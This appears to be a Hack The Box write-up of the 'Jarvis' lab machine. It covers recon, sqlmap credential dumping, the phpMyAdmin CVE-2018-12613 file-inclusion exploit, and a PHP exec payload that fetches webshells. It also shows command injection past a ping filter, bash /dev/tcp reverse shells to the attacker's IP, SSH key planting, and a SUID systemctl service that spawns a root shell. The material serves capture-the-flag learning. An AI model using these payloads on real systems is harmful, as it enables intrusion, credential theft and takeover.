I"iy<p><img src="/wp-content/uploads/2019/07/jarvis/badge.png" alt="Hack The Box Writeup" /></p>

<h1 id="information-gathering">Information Gathering</h1>

<h2 id="nmap">Nmap</h2>
<p>We begin our reconnaissance by running a port scan with Nmap, checking default scripts and testing for vulnerabilities.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali:/media/sf_Research#</span><span class="w"> </span>nmap <span class="nt">-sVC</span> <span class="nt">-p-</span> 10.10.10.143
<span class="go">Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-22 22:36 EDT
Nmap scan report for 10.10.10.143
Host is up (0.35s latency).
Not shown: 65531 closed ports
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
80/tcp    open     http    Apache httpd 2.4.25 ((Debian))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Stark Hotel
5355/tcp  filtered llmnr
64999/tcp open     http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesnt have a title (text/html).
</span><span class="gp">Service Info: OS: Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
<span class="go">
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 3380.59 seconds

</span></code></pre></div></div>

<p>From the above output we can see that ports, <strong>22</strong>, <strong>80</strong>, <strong>5355</strong>, and <strong>64999</strong> are open.</p>

<p>We know the common ports for ssh and http are open, and we’ll explore those in a moment. <a href="https://en.wikipedia.org/wiki/Link-Local_Multicast_Name_Resolution">Link-Local Multicast Name Resolution</a> is running on port <strong>5355</strong>, and the path we’ll be taking to get root doesn’t involve that, but I’m interested to read other hackers’ writeups to see if there is another method to root involving port <strong>5355</strong>. It looks like port <strong>64999</strong> serves a ban notice, but that never comes into play for us either.</p>

<h2 id="http-enumeration">HTTP Enumeration</h2>

<p>Browsing to port <strong>80</strong>, we come across the website for the Stark Hotel. The site is written in PHP, but doesn’t appear to be running any known CMS.</p>

<p><img src="/wp-content/uploads/2019/07/jarvis/stark_hotel.png" alt="The Stark Hotel" />
<strong>Figure 1:</strong> The Stark Hotel</p>

<p>While we explore the Stark Hotel’s website manually, it’s a good idea to run a directory enumeration script in the background to find more interesting things. Since I’ve become a big fan of <a href="https://github.com/maurosoria/dirsearch">dirsearch</a> that’s what we’ll use here. In this instance we’re using the default wordlist with <code class="language-plaintext highlighter-rouge">txt</code> and <code class="language-plaintext highlighter-rouge">php</code> extensions, and telling it to run recursively.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali:~/Tools/dirsearch#</span><span class="w"> </span>python3 dirsearch.py <span class="nt">-u</span> http://10.10.10.143 <span class="nt">-e</span> txt,php <span class="nt">-r</span>
<span class="go">
 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions: txt, php | HTTP method: get | Threads: 10 | Wordlist size: 6390 | Recursion level: 1

Error Log: /root/Tools/dirsearch/logs/errors-19-07-25_12-39-55.log

Target: http://10.10.10.143

[12:39:57] Starting: 
[12:43:54] 200 -   23KB - /index.php
[12:43:56] 200 -   23KB - /index.php/login/
[12:45:12] 200 -   14KB - /phpmyadmin/
[12:46:54] Starting: css/
[12:47:03] 200 -    6KB - /css/.DS_Store
[12:53:40] Starting: fonts/
[12:53:49] 200 -    8KB - /fonts/.DS_Store
[13:00:32] Starting: images/
[13:00:40] 200 -    6KB - /images/.DS_Store
[13:07:19] Starting: js/
[13:07:28] 200 -    6KB - /js/.DS_Store
[13:14:16] Starting: phpmyadmin/
[13:14:25] 200 -  274B  - /phpmyadmin/.editorconfig
[13:14:25] 200 -   24B  - /phpmyadmin/.eslintignore
[13:16:58] 200 -   19KB - /phpmyadmin/ChangeLog
[13:17:06] 200 -    3KB - /phpmyadmin/composer.json
[13:17:10] 200 -   89KB - /phpmyadmin/composer.lock
[13:17:14] 200 -    2KB - /phpmyadmin/CONTRIBUTING.md
[13:17:30] 200 -  958B  - /phpmyadmin/doc/
[13:17:44] 200 -    2KB - /phpmyadmin/examples/
[13:17:47] 200 -   22KB - /phpmyadmin/favicon.ico
[13:18:13] 200 -   14KB - /phpmyadmin/import.php
[13:18:16] 200 -   14KB - /phpmyadmin/index.php
[13:18:18] 200 -   14KB - /phpmyadmin/index.php/login/
[13:18:32] 200 -   18KB - /phpmyadmin/LICENSE
[13:18:32] 200 -   14KB - /phpmyadmin/license.php
[13:19:14] 200 -  733B  - /phpmyadmin/package.json
[13:19:24] 200 -   14KB - /phpmyadmin/phpinfo.php
[13:19:46] 200 -    1KB - /phpmyadmin/README
[13:19:51] 200 -   26B  - /phpmyadmin/robots.txt
[13:20:04] 200 -   10KB - /phpmyadmin/setup/
[13:20:18] 200 -    2KB - /phpmyadmin/sql/
[13:20:18] 200 -   14KB - /phpmyadmin/sql.php
[13:20:36] 200 -    8KB - /phpmyadmin/templates/
[13:20:41] 200 -  958B  - /phpmyadmin/tmp/
[13:20:57] 200 -    0B  - /phpmyadmin/vendor/autoload.php
[13:20:57] 200 -    0B  - /phpmyadmin/vendor/composer/autoload_classmap.php
[13:20:57] 200 -    0B  - /phpmyadmin/vendor/composer/autoload_namespaces.php
[13:20:57] 200 -    0B  - /phpmyadmin/vendor/composer/autoload_files.php
[13:20:57] 200 -    0B  - /phpmyadmin/vendor/composer/autoload_psr4.php
[13:20:57] 200 -    0B  - /phpmyadmin/vendor/composer/autoload_static.php
[13:20:57] 200 -    0B  - /phpmyadmin/vendor/composer/ClassLoader.php
[13:20:57] 200 -    0B  - /phpmyadmin/vendor/composer/autoload_real.php
[13:20:57] 200 -    1KB - /phpmyadmin/vendor/composer/LICENSE
[13:20:58] 200 -   32KB - /phpmyadmin/vendor/composer/installed.json
[13:21:13] Starting: server-status/
[13:28:15] Starting: doc/
[13:35:11] Starting: examples/
[13:45:28] Starting: libraries/
[13:56:16] Starting: setup/
[14:05:05] Starting: sql/
[14:13:28] Starting: templates/
[14:21:55] Starting: themes/
[14:30:43] Starting: tmp/

Task Completed

</span></code></pre></div></div>

<p>I’ve omitted the <code class="language-plaintext highlighter-rouge">301</code> and <code class="language-plaintext highlighter-rouge">403</code> responses from the output above so that it isn’t quite as long. Anyhow, the most important discovery made during directory enumeration is that of the <code class="language-plaintext highlighter-rouge">phpmyadmin</code> directory and some of its exposed contents.</p>

<p>We can gather that the version of <code class="language-plaintext highlighter-rouge">phpmyadmin</code> installed is <strong>4.8.0</strong>. There are a few ways to do this, but one of the ways is through the exposed change log file at <code class="language-plaintext highlighter-rouge">http://10.10.10.143/phpmyadmin/ChangeLog</code>.</p>

<p>This version is vulnerable to  <a href="https://nvd.nist.gov/vuln/detail/CVE-2018-12613">CVE-2018-12613</a>,</p>

<blockquote>
  <p>An issue was discovered in phpMyAdmin 4.8.x before 4.8.2, in which an attacker can include (view and potentially execute) files on the server. The vulnerability comes from a portion of code where pages are redirected and loaded within phpMyAdmin, and an improper test for white-listed pages. An attacker must be authenticated, except in the “$cfg[‘AllowArbitraryServer’] = true” case (where an attacker can specify any host he/she is already in control of, and execute arbitrary code on phpMyAdmin) and the “$cfg[‘ServerDefault’] = 0” case (which bypasses the login requirement and runs the vulnerable code without any authentication).</p>
</blockquote>

<h3 id="manual-exploration">Manual Exploration</h3>

<p><img src="/wp-content/uploads/2019/07/jarvis/room.png" alt="Room 1: room.php?cod=1" />
<strong>Figure 2:</strong> Room 1: room.php?cod=1</p>

<p>We also know that the site is running a custom PHP application for the Stark Hotel which appears as if it may have an SQL injection vulnerability in the way it handles displaying the rooms <code class="language-plaintext highlighter-rouge">http://10.10.10.143/room.php?cod=SOMETHINGDIRTY!</code>.</p>

<h1 id="exploitation">Exploitation</h1>

<h2 id="initial-foothold">Initial Foothold</h2>

<p>In order to exploit the local file inclusion vulnerability (<a href="https://nvd.nist.gov/vuln/detail/CVE-2018-12613">CVE-2018-12613</a>) on the version of phpmyadmin running, which can lead to remote code execution, we need to get some login credentials.</p>

<h3 id="sqlmap">sqlmap</h3>
<p>Attempting SQL injection manually through the url bar didn’t get us very far. In this instance we turn to sqlmap to do the work for us (feel like script kiddie?). Below is the output for having sqlmap dump the output of the usernames and passwords it can find.</p>

<p><strong>Note</strong>: It should be noted that these were cached already because I first ran sqlmap with the <code class="language-plaintext highlighter-rouge">-a</code> flag.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali:~#</span><span class="w"> </span>sqlmap <span class="nt">-u</span> <span class="s1">'http://10.10.10.143/room.php?cod=5'</span> <span class="nt">--users</span> <span class="nt">--passwords</span>
<span class="go">        ___
       __H__
</span><span class="gp"> ___ ___[']_____ ___ ___  {1.3.6#</span>stable<span class="o">}</span>
<span class="go">|_ -| . [']     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:56:36 /2019-07-22/

[11:56:36] [INFO] resuming back-end DBMS 'mysql' 
[11:56:36] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: cod (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cod=5 AND 9234=9234

    Type: time-based blind
</span><span class="gp">    Title: MySQL &gt;</span><span class="o">=</span> 5.0.12 AND time-based blind <span class="o">(</span>query SLEEP<span class="o">)</span>
<span class="go">    Payload: cod=5 AND (SELECT 8600 FROM (SELECT(SLEEP(5)))FUdN)

    Type: UNION query
    Title: Generic UNION query (NULL) - 7 columns
    Payload: cod=-1326 UNION ALL SELECT NULL,CONCAT(0x716a716a71,0x67666f747663416d57796c4c674d574841464b6e62774362465953737151417651536f7a526e526e,0x7170787871),NULL,NULL,NULL,NULL,NULL-- rAJB
---
[11:56:37] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 9.0 (stretch)
web application technology: Apache 2.4.25
</span><span class="gp">back-end DBMS: MySQL &gt;</span><span class="o">=</span> 5.0.12
<span class="go">[11:56:37] [INFO] fetching database users
[11:56:37] [INFO] used SQL query returns 28 entries
database management system users [1]:                                                 
[*] 'DBadmin'@'localhost'

[11:56:37] [INFO] fetching database users password hashes
[11:56:37] [INFO] used SQL query returns 1 entry
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[11:56:41] [INFO] writing hashes to a temporary file '/tmp/sqlmapgPiv8o5143/sqlmaphashes-NceIbU.txt' 
do you want to perform a dictionary-based attack against retrieved password hashes? [Y/n/q] y
[11:56:44] [INFO] using hash method 'mysql_passwd'
[11:56:44] [INFO] resuming password 'imissyou' for hash '*2d2b7a5e4e637b8fba1d17f40318f277d29964d0' for user 'DBadmin'
database management system users password hashes:
[*] DBadmin [1]:
    password hash: *2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
    clear-text password: imissyou

[11:56:44] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.10.143'

[*] ending @ 11:56:44 /2019-07-22/

</span></code></pre></div></div>

<p>Above we see that sqlmap has found the password for the user <code class="language-plaintext highlighter-rouge">DBadmin</code> to be <code class="language-plaintext highlighter-rouge">imissyou</code>.</p>

<p>Now that we have the admin login credentials to MySQL we are able to login to <code class="language-plaintext highlighter-rouge">phpmyadmin</code> and exploit it to gain a shell.</p>

<p><img src="/wp-content/uploads/2019/07/jarvis/phpmyadmin_loggedin.png" alt="phpMyAdmin control panel." />
<strong>Figure 3:</strong> phpMyAdmin control panel.</p>

<h3 id="apache-setup">Apache Setup</h3>
<p>I’m already aware from previous machines that <a href="https://hackthebod.eu">HTB’s</a> boxes don’t allow connecting to github in order to download things we regularly need. So, this time we’re going to use Kali’s apache server to host some of our own tools to easily download to the box when we get our first shell. We will start the apache service on kali with <code class="language-plaintext highlighter-rouge">service apache2 start</code>. Then, place our two php shells in the <code class="language-plaintext highlighter-rouge">/var/www/html</code> directory, but with the <code class="language-plaintext highlighter-rouge">.txt</code> extension instead of <code class="language-plaintext highlighter-rouge">.php</code>. It’s always convenient to also include the latest versions of <a href="https://github.com/diego-treitos/linux-smart-enumeration">lse.sh</a>, <a href="https://github.com/DominicBreuker/pspy">pyspy</a>, and your public key.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali:/var/www/html#</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span>
<span class="go">total 4460
drwxr-xr-x 2 root root    4096 Jul 22 21:04 .
drwxr-xr-x 3 root root    4096 Feb 11 02:35 ..
-rw-r--r-- 1 root root     391 Jul 22 13:23 id_rsa.pub
-rw-r--r-- 1 root root   10701 Jan 30 02:12 index.html
-rw-r--r-- 1 root root   30972 Jul 22 13:23 lse.sh
-rw-r--r-- 1 root root    5493 Jul 22 13:23 php-reverse-shell.txt
-rwxrwx--- 1 root root 4468984 Jul 22 13:23 pspy64
-rw-r--r-- 1 root root   15744 Jul 22 13:23 shell.txt
</span></code></pre></div></div>

<h3 id="cve-2018-12613">CVE-2018-12613</h3>
<p>In order to exploit the vulnerability, we first navigate to the SQL Tab and run the following query.</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="s1">'&lt;?php exec("wget -O /var/www/html/shell.php http://10.10.14.61/shell.txt &amp;&amp; wget -O /var/www/html/rshell.php http://10.10.14.61/php-reverse-shell.txt ");  ?&gt;'</span>
</code></pre></div></div>
<p>The query contains php calling <code class="language-plaintext highlighter-rouge">exec</code> to execute shell commands which <code class="language-plaintext highlighter-rouge">wget</code> the two php shells we put onto our Kali box’s apache server, and changing their extensions to <code class="language-plaintext highlighter-rouge">.php</code>.</p>

<p><img src="/wp-content/uploads/2019/07/jarvis/if_1.png" alt="CVE-2018-12613 Setp 1." />
<strong>Figure 4:</strong> Paset in malicious query containing php code, click ‘go’.</p>

<p><img src="/wp-content/uploads/2019/07/jarvis/if2.png" alt="CVE-2018-12613 Setp 2." />
<strong>Figure 5:</strong> Query executed, malicious php code stored in database.</p>

<p>To execute the code we’ve just stored, we must first determine the value of our session variable, and append it to the url <code class="language-plaintext highlighter-rouge">http://10.10.10.143/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_FILLMEINS</code></p>

<p>For this we use the <a href="https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/">Cookie-Editor</a> Firefox Extension, and check the value of the <code class="language-plaintext highlighter-rouge">phpMyAdmin</code> cookie.</p>

<p><img src="/wp-content/uploads/2019/07/jarvis/if3.png" alt="CVE-2018-12613 Setp 2." />
<strong>Figure 6:</strong> phpMyAdmin session.</p>

<p>Now that the session variable is known we navigate to the url in order to execute our php code.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.10.143/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_rgaqjb5lk26btifbs4alv75bj4hm1ljj
</code></pre></div></div>

<p><img src="/wp-content/uploads/2019/07/jarvis/if4.png" alt="CVE-2018-12613 Setp 2." />
<strong>Figure 7:</strong> php execution.</p>

<p>We now have our p0wny webshell available on <code class="language-plaintext highlighter-rouge">http://10.10.10.143/shell.php</code>. Our reverse shell is also available, and that’s what we’re going to use mostly for the rest of the box. Start netcat to have it listen <code class="language-plaintext highlighter-rouge">nc -lvp 4444</code>. Then call <code class="language-plaintext highlighter-rouge">rshell.php</code> either by navigating to <code class="language-plaintext highlighter-rouge">http://10.10.10.143/rshell.php</code>, or via the web shell. We issue the following command to get a more interactive shell.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">python3 -c 'import pty;</span>pty.spawn<span class="o">(</span><span class="s2">"/bin/bash"</span><span class="o">)</span><span class="s1">'
</span></code></pre></div></div>

<p><img src="/wp-content/uploads/2019/07/jarvis/ncshell1.png" alt="php reverse shell." />
<strong>Figure 8:</strong> php reverse shell as www-data user.</p>

<h3 id="linux-smart-enumeration">Linux Smart Enumeration</h3>

<p>After grabbing Linux Smart Enumeration we run it and discover two particularly interesting things.</p>

<p><img src="/wp-content/uploads/2019/07/jarvis/lse.png" alt="Linux Smart Enumeration." />
<strong>Figure 9:</strong> Linux Smart Enumeration.</p>

<p>We see that there are uncommon setuid binaries, and that the user <code class="language-plaintext highlighter-rouge">www-data</code> has access to run an administration tool as <code class="language-plaintext highlighter-rouge">pepper</code> (without entering a password).</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">User www-data may run the following commands on jarvis:
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
</span></code></pre></div></div>

<h2 id="user-flag">User Flag</h2>

<p>Let’s read the source code for <strong><em><a href="https://gist.github.com/d0n601/270adf14cca07f438d3564ec3333f84c">simpler.py</a></em></strong>. The function that jumps out as exploitable is <code class="language-plaintext highlighter-rouge">exec_ping()</code>, since it directly runs user input.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">exec_ping</span><span class="p">():</span>
    <span class="n">forbidden</span> <span class="o">=</span> <span class="p">[</span><span class="s">'&amp;'</span><span class="p">,</span> <span class="s">';'</span><span class="p">,</span> <span class="s">'-'</span><span class="p">,</span> <span class="s">'`'</span><span class="p">,</span> <span class="s">'||'</span><span class="p">,</span> <span class="s">'|'</span><span class="p">]</span>
    <span class="n">command</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">'Enter an IP: '</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">forbidden</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">command</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="s">'Got you'</span><span class="p">)</span>
            <span class="nb">exit</span><span class="p">()</span>
    <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">'ping '</span> <span class="o">+</span> <span class="n">command</span><span class="p">)</span>
</code></pre></div></div>
<p>Full source for <strong><em><a href="https://gist.github.com/d0n601/270adf14cca07f438d3564ec3333f84c">simpler.py</a></em></strong></p>

<p>The function filters certain commands to prevent us from injecting naughty things into it. It does not, however, filter out the <code class="language-plaintext highlighter-rouge">$</code> character which means we can encapsulate a bash command.</p>

<blockquote>
  <p>A bash command can then be encapsulated using the $()
     technique.</p>
</blockquote>

<p><strong>Source:</strong> <a href="https://packetstormsecurity.com/files/144749/Infoblox-NetMRI-7.1.4-Shell-Escape-Privilege-Escalation.html">PacketStorm</a></p>

<p>Even though we are the <code class="language-plaintext highlighter-rouge">www-data</code> user, we’re able to execute <code class="language-plaintext highlighter-rouge">simpler.py</code> as the <code class="language-plaintext highlighter-rouge">pepper</code> like such,</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@jarvis:/var/www/Admin-Utilities$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-u</span> pepper ./simpler.py <span class="nt">-p</span>
</code></pre></div></div>

<p>Enter <code class="language-plaintext highlighter-rouge">$(/bin/bash)</code> into the prompt for the <code class="language-plaintext highlighter-rouge">-p</code> command to spawn a shell as the <code class="language-plaintext highlighter-rouge">pepper</code> user. What was odd is that this new shell did not return anything to the screen. Meaning commands like <code class="language-plaintext highlighter-rouge">ls</code>, <code class="language-plaintext highlighter-rouge">pwd</code>, and <code class="language-plaintext highlighter-rouge">cat</code> returned nothing. Perhaps someone else could explain why this was for me?</p>

<p>Anyway, we can spawn another reverse shell as the <code class="language-plaintext highlighter-rouge">pepper</code> user now though via <code class="language-plaintext highlighter-rouge">bash -i &gt;&amp; /dev/tcp/10.10.14.61/6666 0&gt;&amp;1</code>. With this shell we can grab <code class="language-plaintext highlighter-rouge">cat user.txt</code>.</p>

<p><img src="/wp-content/uploads/2019/07/jarvis/user_flag.png" alt="user flag." />
<strong>Figure 10:</strong> user flag <strong><em>2afa36c4f05b37b34259c93551f5c44f</em></strong>.</p>

<h2 id="root-flag">Root Flag</h2>
<p>In order to escalate our privileges from <code class="language-plaintext highlighter-rouge">pepper</code> to <code class="language-plaintext highlighter-rouge">root</code>, we first need to check which binaries have the SUID bit flipped, meaning they run as the owner, not the user who started them.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">find / -perm -u=s -type f 2&gt;</span>/dev/null
</code></pre></div></div>
<p>The above returns many programs from the <code class="language-plaintext highlighter-rouge">/bin</code> directory. So lets check up the permissions of the binaries in that directory.</p>

<p><img src="/wp-content/uploads/2019/07/jarvis/systemctl_misconfig.png" alt="user flag." />
<strong>Figure 11:</strong> Look who owns systemctl!</p>

<h3 id="privilege-escalation-a-proper-shell">Privilege Escalation: A proper shell</h3>
<p>In order to exploit <code class="language-plaintext highlighter-rouge">systemctl</code> we need a proper shell. The below method does not function on a reverse shell, as we cannot enable services through it. This was discovered via trial and error, and I can’t explain exactly as to why.</p>

<p>To get the shell we need we’re simply going to take the public key we’ve got on our apache server and copy it into <code class="language-plaintext highlighter-rouge">~/.ssh/authorized_keys</code>. It may be the case that we need to create this directory and file, if no other HTB users have done it since the box has been reset.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">pepper@jarvis:~/.ssh$</span><span class="w"> </span><span class="nb">cd</span> /tmp
<span class="go">cd /tmp
</span><span class="gp">pepper@jarvis:/tmp$</span><span class="w"> </span>wget http://10.10.14.61/id_rsa.pub
<span class="go">wget http://10.10.14.61/id_rsa.pub
--2019-07-23 21:29:15--  http://10.10.14.61/id_rsa.pub
Connecting to 10.10.14.61:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 391
Saving to: 'id_rsa.pub'

     0K                                                       100% 91.7M=0s

2019-07-23 21:29:16 (91.7 MB/s) - 'id_rsa.pub' saved [391/391]

</span><span class="gp">pepper@jarvis:/tmp$</span><span class="w"> </span><span class="nb">cat </span>id_rsa.pub <span class="o">&gt;&gt;</span> ~/.ssh/authorized_keys
</code></pre></div></div>

<p><img src="/wp-content/uploads/2019/07/jarvis/ssh_pepper.png" alt="ssh as pepper." />
<strong>Figure 12:</strong> SSH’ing in directly using our public key.</p>

<h3 id="exploiting-systemctl">Exploiting systemctl</h3>

<p>Since we know that the <code class="language-plaintext highlighter-rouge">systemctl</code> binary is going to be run as <code class="language-plaintext highlighter-rouge">root</code>, let’s create our own service to call a reverse shell (as root!).</p>

<p>First we create our script to call a reverse shell, we’ll call it <code class="language-plaintext highlighter-rouge">shelly.sh</code>. This time we have netcat listening on port <code class="language-plaintext highlighter-rouge">7777</code>. We also need to <code class="language-plaintext highlighter-rouge">chmod +x /tmp/shelly.sh</code> so that it’s executable.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/bin/bash  
bash -i &gt;&amp; /dev/tcp/10.10.14.61/7777 0&gt;&amp;1
</code></pre></div></div>

<p>Next we create <code class="language-plaintext highlighter-rouge">revshell_root.service</code> to execute our reverse shell as root.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[Unit]
Description=root shell

[Service]
ExecStart=/tmp/shelly.sh

[Install]
WantedBy=multi-user.target
</code></pre></div></div>

<p>Once <code class="language-plaintext highlighter-rouge">shelly.sh</code> and <code class="language-plaintext highlighter-rouge">revshell_root.service</code> are in the <code class="language-plaintext highlighter-rouge">/tmp</code> directory, we enable the services through <code class="language-plaintext highlighter-rouge">systemctl</code>, and then start the service. Upon starting the service our reverse shell is triggered, and we’re root!</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">pepper@jarvis:/tmp$</span><span class="w"> </span>systemctl <span class="nb">enable</span> /tmp/revshell_root.service
<span class="go">Created symlink /etc/systemd/system/multi-user.target.wants/revshell_root.service → /tmp/revshell_root.service.
Created symlink /etc/systemd/system/revshell_root.service → /tmp/revshell_root.service.
</span><span class="gp">pepper@jarvis:/tmp$</span><span class="w"> </span>systemctl start revshell_root.service
</code></pre></div></div>

<p><img src="/wp-content/uploads/2019/07/jarvis/rooted.png" alt="rooted." />
<strong>Figure 13:</strong> Root Shell</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@jarvis:~#</span><span class="w"> </span><span class="nb">cat </span>root.txt
<span class="go">cat root.txt
d41d8cd98f00b204e9800998ecf84271
</span></code></pre></div></div>

<h1 id="conclusion">Conclusion</h1>

<p>I learned a lot from this box. I learned just how powerful a tool <code class="language-plaintext highlighter-rouge">sqlmap</code> is. I’m very new to using this tool, and apparently I could have used it to spawn a shell directly. Perhaps I wouldn’t have needed to exploit phpmyadmin in this case? That’s something I’ll certainly look into next.</p>

<p>This box also taught me a little more about <code class="language-plaintext highlighter-rouge">systemctl</code> and the syntax to create and run new services.</p>

<p>I’m really interested in reading other people’s writeups to see what other methods could be used to root this box. Jarvis seemed to have many different solutions, which is very cool. I’m excited to see if the LLMNR port came into play at all for anyone, what other methods people used to gain their initial foothold, and how many different ways there were for escalating privileges from <code class="language-plaintext highlighter-rouge">www-data</code> to <code class="language-plaintext highlighter-rouge">pepper</code>, and from <code class="language-plaintext highlighter-rouge">pepper</code> to <code class="language-plaintext highlighter-rouge">root</code>.</p>

<h2 id="references">References</h2>

<ol>
  <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2018-12613">https://nvd.nist.gov/vuln/detail/CVE-2018-12613</a></li>
  <li><a href="https://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-LFI-Exploit/">https://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-LFI-Exploit/</a></li>
  <li><a href="https://security.stackexchange.com/questions/212427/why-doesnt-my-systemctl-command-work">https://security.stackexchange.com/questions/212427/why-doesnt-my-systemctl-command-work</a></li>
  <li><a href="https://packetstormsecurity.com/files/144749/Infoblox-NetMRI-7.1.4-Shell-Escape-Privilege-Escalation.html">https://packetstormsecurity.com/files/144749/Infoblox-NetMRI-7.1.4-Shell-Escape-Privilege-Escalation.html</a></li>
  <li><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a></li>
</ol>
:ET